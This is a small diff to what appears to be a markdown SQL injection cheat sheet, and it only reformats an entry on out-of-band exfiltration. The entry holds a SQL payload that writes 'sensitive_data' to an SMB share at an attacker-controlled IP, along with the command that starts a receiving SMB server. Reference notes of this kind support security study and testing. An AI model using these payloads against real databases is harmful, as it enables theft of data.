@@ -23,7 +23,7 @@ Anything after -- on the same line is ignored by the database.
 Sends SQL messages to a external source, for a example a python server.
 
 Internal:
-```SELECT sensitive_data INTO OUTFILE '\\\\[IP ADDRESS]\\logs\\out.txt';```
+*  ```SELECT sensitive_data INTO OUTFILE '\\\\[IP ADDRESS]\\logs\\out.txt';```
 
 External:
 *  ```python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp```
